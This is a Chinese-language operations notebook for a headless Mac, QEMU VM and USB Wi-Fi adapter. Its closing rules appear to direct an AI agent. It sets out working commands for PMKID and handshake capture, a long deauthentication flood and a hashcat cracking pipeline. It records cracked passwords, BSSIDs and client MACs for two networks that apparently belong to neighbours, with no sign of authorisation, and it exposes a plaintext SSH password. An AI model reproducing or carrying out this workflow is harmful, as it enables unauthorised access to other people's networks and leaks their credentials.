# Mac Headless + DWA-160 抓包知識庫

> 遇到問題優先搜尋大神解法，寫進此檔。

## 一、FileVault 遠端解鎖（macOS 26 Tahoe）

**來源**: Apple 官方 `apple_ssh_and_filevault(7)` man page、Jeff Geerling blog (2025-09)、Reddit r/mac

### 原理
- macOS 26+ Apple Silicon：Remote Login 啟用時，preboot 階段就有 SSH 服務
- 重開機後 → `ssh user@mac` → 輸入密碼 → FileVault 解鎖 → 正常 boot
- **只能用密碼認證**（key-based 不行，因為 authorized_keys 在加密磁碟上）
- Wi-Fi 在早期 26.x 有 bug（需 Ethernet），26.5+ 已修

### 操作步驟
```bash
# Windows 端用 paramiko（Git Bash 沒有 sshpass）
python -c "
import paramiko
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('192.168.1.123', 22, 'tongbao', '240628',
          allow_agent=False, look_for_keys=False, timeout=15)
print('unlocked!')
c.close()
"
```

### 注意事項
- 解鎖後 LaunchDaemons 會啟動，但 **LaunchAgents 要等 GUI login**
- 我們的流程只需要 sshd + qemu（從 SSH session 啟動）→ 不受影響
- 若 Mac 是 macOS ≤25：無此功能，需物理解鎖一次 → `fdesetoff` + auto-login

### 本機狀態
- Mac: macOS 26.6.2 (BuildVersion 25G83), Apple Silicon
- Remote Login: On（一直開著）
- FileVault: On（保留，靠 preboot SSH 解鎖）
- AutoLoginUser: 3（best effort，SSH 解鎖後不需要）

---

## 二、DWA-160 (RT5592) RX 問題

### 症狀
- 每個 Mac power-cycle 只有**第一個 VM 的第一個 airodump session** 能收包
- 之後所有 airodump/tcpdump = 0 bytes
- firmware load 正常（dmesg "Firmware detected" ✓）但 RX pipeline 死掉

### 已嘗試（全部失敗）
| 方法 | 結果 |
|------|------|
| ifconfig down/up | ✗ FW count 不變，RX 仍 0 |
| rmmod/modprobe rt2800usb 鏈 | ✗ 重新 probe OK 但 RX 0 |
| QMP device_del + device_add | ✗ `can't set config #1, error -32` (EAGAIN) |
| Guest 內 USB unbind/bind (`/sys/bus/usb/drivers/usb`) | ✗ 新 phy 出現但 RX 0 |
| tcpdump on monitor iface | ✗ 0 bytes |
| 重開 VM（同 Mac boot） | ✗ 0 bytes |

### 唯一有效
**Mac 完整重開機**（USB power cycle）→ 第一個 VM 的第一個 airodump session

### 大神解法（待驗證）
1. **`guest-reset=false`**（QEMU usb-host 參數）
   - 來源: QEMU commit ba4c735b / GitLab #3243
   - 防止 guest reset 傳到 host 端導致設備狀態污染
   - 用法: `-device usb-host,vendorid=0x148f,productid=0x5572,guest-reset=false,id=dwa160`
   
2. **UTM 替代 QEMU**（Apple Silicon 專用 GUI wrapper）
   - 來源: Apple Discussions
   - UTM 對 USB passthrough 處理較好
   
3. **確認 macOS Privacy & Security → "Allow accessories to connect" = Always when unlocked**
   - 來源: Apple Discussions thread 256074704
   - M-series 需要批准 USB 配件

4. **rt2800usb 驅動層 hot-swap mac80211**
   - 來源: morrownr/USB-WiFi #682
   - `rmmod wifi_driver && rmmod mac80211 && insmod mac80211.ko && modprobe wifi_driver`
   - 比單純 rmmod/modprobe 多一步：連 mac80211 一起卸載重建

### 目前策略
- 每次抓包前 Mac 重開機（自動：preboot SSH 解鎖 → watcher 自動跑）
- 若 `guest-reset=false` 驗證有效 → 可免重開機

---

## 三、Headless Mac 最佳實務

### pmset 設定（防睡 + 斷電自啟）
```bash
sudo pmset -a sleep 0              # 永不休眠
sudo pmset -a displaysleep 10      # 螢幕可關
sudo pmset -a womp 1               # Wake for network access
sudo pmset -a autorestart 1        # 斷電後自動開機
```

### 網路
- 固定 IP 或 DHCP reservation（192.168.1.123）
- Wi-Fi 優先（本機無 Ethernet port）
- 若 Wi-Fi preboot 不穩 → 考慮 USB-Ethernet dongle

### SSH
- Remote Login: On（System Settings → General → Sharing）
- 金鑰: `~/.ssh/opremote_ed25519`（Windows 端）
- BatchMode=yes 自動化

### 持久化路徑
- **絕對不要用 `/tmp`**（Mac 重開機被清）
- 所有建置檔放 `~/vmbuild/`
- VM qcow2: `~/vmbuild/alpine-root.qcow2`
- Kernel/initrd: `~/vmbuild/vmbuild/boot/`
- Runner initrd: `~/vmbuild/vmbuild/runner-initrd`

---

## 四、VM 架構速查

### Runner Mode（推薦）
- initramfs 內跑 sshd + chroot /newroot 跑 aircrack
- Boot ~10s（vs alpine OpenRC 6min+ 不穩定）
- `/init` patched: `if false && [ -x /newroot/sbin/init ]` → 留在 initramfs
- Bind mounts: proc/sys/dev → /newroot/

### Alpine Root (qcow2)
- 96 packages: aircrack-ng, hcxtools, iw, openssh, firmware-ralink
- Firmware: `/usr/lib/firmware/rt2870.bin` (v0.36)
- SSH key: vm_tongbao (ed25519)

### QEMU 啟動參數
```
/opt/homebrew/bin/qemu-system-aarch64 \
  -machine virt -cpu cortex-a72 -m 4096 -smp 4 \
  -drive file=$HOME/vmbuild/alpine-root.qcow2,format=qcow2 \
  -kernel $HOME/vmbuild/vmbuild/boot/vmlinuz-lts \
  -initrd $HOME/vmbuild/vmbuild/runner-initrd \
  -append console=ttyAMA0 \
  -chardev file,id=s0,path=/tmp/runner_serial.log,append=on -serial chardev:s0 \
  -netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 \
  -device virtio-net-pci,netdev=n0 \
  -device qemu-xhci,id=xhci \
  -device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 \
  -display none \
  -monitor unix:/tmp/vm_app_monitor.sock,server,nowait
```

### 抓包流程（雙路線：PMKID + EAPOL）

**路線 A：hcxdumptool（推薦，54s 搞定）**
1. `mount --bind /proc /sys /dev → /newroot/`
2. `ifconfig wlan0 up`（讓 hcxdumptool 自己管 monitor mode）
3. 等 firmware loaded (dmesg grep "Firmware detected")
4. `chroot /newroot /usr/local/bin/hcxdumptool -i wlan0 -w /tmp/cap.pcapng -c 1a --rds=3`（跑 60s）
5. `chroot /newroot /usr/local/bin/hcxpcapngtool -o /tmp/out.hc22000 /tmp/cap.pcapng`
6. 檢查 .hc22000 有 `WPA*01*`（PMKID）或 `WPA*02*`（EAPOL）行
7. POST JSON → Windows :8766 `/api/receive-hash`

**路線 B：airodump + deauth（當 PMKID 不可用時）**
1-5. 同上（但手動設 monitor mode）
6. **單一** `airodump-ng wlan0 -c 1 -w /tmp/capXXX`（全程不 kill）
7. 25s 後檢查 .cap > 3000 bytes
8. `aireplay-ng --deauth 9999 --ignore-negative-one -a <BSSID> -c <CLIENT>`
9. 等 10-15 min
10. `hcxpcapngtool -o out.hc22000 in.cap`
11. POST → Windows :8766

**注意**：
- hcxdumptool v7 語法與 v5 不同（`-w` 非 `-o`，`-c 1a` 非 `-c 1`）
- hcxdumptool 會自己改 interface mode → 不要先手動 `iw set type monitor`
- airodump 路線需要手動 down→monitor→up（kernel 無 WEXT）

---

## 五、Windows Cracker

- IP: 192.168.1.107:8766
- hashcat: `C:\tools\hashcat-7.1.2\hashcat.exe`
- Wordlists: `C:\wifi-crack\wordlists\{rockyou.txt (140MB), wifi_wordlist_combined.txt (1.5MB)}`
- API: `POST /api/receive-hash` — **JSON body**: `{"hash": "WPA*01*...", "ssid": "32H10F", "bssid": "bc:..."}`
  - hash 欄位是完整 .hc22000 內容（可多行，含 PMKID + EAPOL）
  - Content-Type: application/json
  - 回傳: `{"ok":true,"message":"Hash received, running multi-stage crack"}`
- 其他 API:
  - `POST /api/extract` — 上傳 raw .pcap/.cap（multipart file），自動轉 hc22000
  - `GET /api/status` — 目前狀態
  - `POST /api/crack` — 手動觸發破解（指定 wordlist/mode/mask）
- 注意: running instance 是舊版 `-w 3`，disk 上是新版 `-w 2`（待重啟更新）

---

## 六、成功抓包紀錄

### 2026-09-20：32H10F PMKID + EAPOL 雙路線成功

**背景**：DWA-160 RX 問題（每個 Mac boot 只有第一 VM 能收包）持續數天，最終靠 macOS 26 preboot SSH 遠端解鎖 + 第一次 VM 啟動解決。

**關鍵突破**：
1. **hcxdumptool v7.1.2**（非 airodump-ng）—— 用 nl80211 而非 WEXT，兼容 kernel 6.18
   - 交叉編譯：Mac (Apple Silicon) 上用 `zig cc -target aarch64-linux-musl -O2 -static`
   - 來源：`C:\wifi-crack\captures\phone\hcxdumptool`（v5.1.7 太舊不支援 nl80211）
   - v7 語法：`hcxdumptool -i wlan0 -w /tmp/pmkid.pcapng -c 1a --rds=3`
     - `-c 1a` = channel 1, band a (2.4GHz)
     - `--rds=3` = 顯示 AP+client 狀態
     - hcxdumptool **自己管理 monitor mode**（不要先手動 set type monitor）

2. **PMKID 攻擊**（繞過 PMKSA cache 問題）
   - AP (bc3e0701dc98) 在 EAPOL M1 的 RSN IE 中 broadcast PMKID ✓
   - 不需要客戶端重連、不需要 deauth storm
   - 54 秒 capture 就拿到 PMKID + EAPOL M1M2

3. **hcxpcapngtool 7.1.2**（aarch64 靜態）
   - 來源：`C:\wifi-crack\hcxtools-win\hcxtools-7.1.2\hcxpcapngtool_aarch64`
   - 傳進 VM：`ssh root@vm 'cat > /newroot/usr/local/bin/hcxpcapngtool' < binary`
   - 轉換：`chroot /newroot /usr/local/bin/hcxpcapngtool -o /tmp/out.hc22000 /tmp/in.pcapng`

**結果**（4 hashes 產出）：
```
WPA*02*...  (EAPOL M1M2, rogue AP, SSID=HOME)
WPA*02*...  (EAPOL M1M2, rogue AP, SSID=32H10F, client=e6894c90cded)
WPA*01*...  (PMKID, AP=bc3e0701dc98, client=e6894c90cded, SSID=32H10F) ← 目標
WPA*02*...  (EAPOL M1M2, AP=bc3e0701dc98, client=e6894c90cded, SSID=32H10F) ← 目標
```

**POST 到 Windows**：
```python
import json, urllib.request
data = json.dumps({"hash": hash_content, "ssid": "32H10F", "bssid": "bc:3e:07:01:dc:98"}).encode()
req = urllib.request.Request("http://192.168.1.107:8766/api/receive-hash", data=data,
                             headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req, timeout=10).read().decode())
# → {"ok":true,"message":"Hash received, running multi-stage crack"}
```

**教訓**：
- airodump-ng + aireplay deauth 對 PMKSA-cached client 無效（10min deauth → 0 EAPOL）
- hcxdumptool 自動做 association request → AP 回 EAPOL M1（含 PMKID）→ 一網打盡
- 不需要「逼」客戶端重連；AP 被 query 就會回應
- qcow2 空間有限（487MB），大 log 檔（airotest.log 180MB）會塞滿 → 定期清理 /newroot/tmp/

### 2026-09-21：全域掃描同時抓到 32H10F + 32H9F，全部破解成功

**方法**：`hcxdumptool -i wlan0 -w /tmp/scanall.pcapng -F -t 7 --rds=2`（全頻道掃描 90s）
- `-F` = 使用所有可用頻率（自動包含 2.4G + 5G）
- `-t 7` = 每頻道停留 7 秒

**發現**：
- 32H10F: AP=bc3e0701dc98, ch1, client=e6894c90cded → PMKID + EAPOL ✓
- 32H9F: AP=6c4f894ca0e3, ch6, client=503123d750ac → EAPOL M1M2 ✓
- HOME: AP=6074f4bae6c2, ch11, client=f024f9eab128 → EAPOL M1M2

**破解結果**：
| SSID | BSSID | 密碼 | 方法 |
|------|-------|------|------|
| 32H10F | bc:3e:07:01:dc:98 | `0932153677` | rockyou+best66 (10-digit) |
| 32H9F | 6c:4f:89:4c:a0:e3 | `0927450713` | mask `?d×10` |

**hashcat 驗證**：
- 32H9F: `Recovered: 4/5 (80%)` — 4 個 hash 匹配（剩 1 個是 rogue AP 不同 salt）
- 32H10F: `Recovered: 3/4 (75%)` — 3 個 hash 匹配

**教訓**：
- 兩個密碼都是 10 位純數字（門牌/電話/日期格式）
- wifi_wordlist (1.5M) 和 rockyou plain (1.4M) 都不夠 → 需要 rules 或 mask
- 全域掃描一次搞定多個目標，比單頻道效率高
- Windows netsh wlan XML profile 對 CCMP 加密有 schema 驗證 bug（TKIP 可以，CCMP 不行）
- Mac 的 saved WiFi credentials 不影響 VM DWA-160 的被動監聽（獨立硬體）

---

## 七、紀律提醒

- 中文回報
- 優化項目須逐項確認
- 一次只改一個變數
- **遇問題先搜大神解法 → 寫進此檔**
- 最小化 ask_user_question（使用者常不在）
- GPU power 由使用者管理
- 手機 adb 未使用